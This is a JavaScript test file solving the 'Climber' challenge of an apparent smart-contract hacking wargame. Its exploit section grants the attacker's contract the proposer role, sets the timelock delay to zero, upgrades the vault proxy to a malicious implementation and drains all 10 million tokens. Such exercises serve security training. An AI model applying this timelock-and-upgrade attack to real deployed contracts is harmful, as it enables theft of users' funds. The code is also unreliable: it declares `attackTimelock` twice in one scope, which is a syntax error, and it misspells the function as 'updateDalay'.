const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Climber', function () {
    let deployer, proposer, sweeper, attacker;

    // Vault starts with 10 million tokens
    const VAULT_TOKEN_BALANCE = ethers.utils.parseEther('10000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, proposer, sweeper, attacker] = await ethers.getSigners();

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));
        
        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        this.vault = await upgrades.deployProxy(
            await ethers.getContractFactory('ClimberVault', deployer),
            [ deployer.address, proposer.address, sweeper.address ],
            { kind: 'uups' }
        );

        expect(await this.vault.getSweeper()).to.eq(sweeper.address);
        expect(await this.vault.getLastWithdrawalTimestamp()).to.be.gt('0');
        expect(await this.vault.owner()).to.not.eq(ethers.constants.AddressZero);
        expect(await this.vault.owner()).to.not.eq(deployer.address);
        
        // Instantiate timelock
        let timelockAddress = await this.vault.owner();
        this.timelock = await (
            await ethers.getContractFactory('ClimberTimelock', deployer)
        ).attach(timelockAddress);
        
        // Ensure timelock roles are correctly initialized
        expect(
            await this.timelock.hasRole(await this.timelock.PROPOSER_ROLE(), proposer.address)
        ).to.be.true;
        expect(
            await this.timelock.hasRole(await this.timelock.ADMIN_ROLE(), deployer.address)
        ).to.be.true;

        // Deploy token and transfer initial token balance to the vault
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
    });

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */
        const attackVault = this.vault.connect(attacker);
        const attackTimelock = this.timelock.connect(attacker);
        const attackToken = this.token.connect(attacker);
        const PROPOSER_ROLE = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("PROPOSER_ROLE"));

        const AttackTimelockFactory = await ethers.getContractFactory("AttackTimelock", attacker);
        const attackTimelock = await AttackTimelockFactory.deploy(
            attackVault.address,
            attackTimelock.address,
            attackToken.address,
            attacker.address);

        const BadImplementationFactory = await ethers.getContractFactory("AttackVault", attacker);
        const badImplementation = await BadImplementationFactory.deploy();

        const buildTx = (signature, methodName, args) => {
            const ABI = signature;
            const IFace = new ethers.utils.Interface(ABI);
            const ABIData = IFace.encodeFunctionData(methodName, args);
            return ABIData;
        }

        // See ../Notes/12-Climber.md
        // Step1:
        const grantRoleSig = ["function grantRole(bytes32 role, address account)"];
        const grantRoleData = buildTx(grantRoleSig, "grantRole", [PROPOSER_ROLE, attackTimelock.address]);

        // Step3:
        const updateDelaySig = ["function updateDalay(uint64 newDelay)"];
        const updateDalayData = buildTx(updateDelaySig, "updateDalay", [0]);

        // Step2:
        const upgradeSig = ["function upgradeTo(address newImplementation)"];
        const upgradeData = buildTx(upgradeSig, "upgradeTo", [badImplementation.address]);

        //
        const hackSig = ["function hack()"];
        const hackData = buildTx(hackSig, "hack", undefined);

        const toAddress = [attackTimelock.address, attackTimelock.address, attackVault.address, attackTimelock.address];
        const data = [grantRoleData, updateDalayData, upgradeData, hackData];
        
        await attackTimelock.setScheduleData(toAddress, data);

        // Step 4:
        await attackTimelock.hack(toAddress, Array(data.length).fill(0), data, ethers.utils.hexZeroPad("0x00", 32));

        // Complete hack
        await attackTimelock.withdraw();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await this.token.balanceOf(this.vault.address)).to.eq('0');
        expect(await this.token.balanceOf(attacker.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
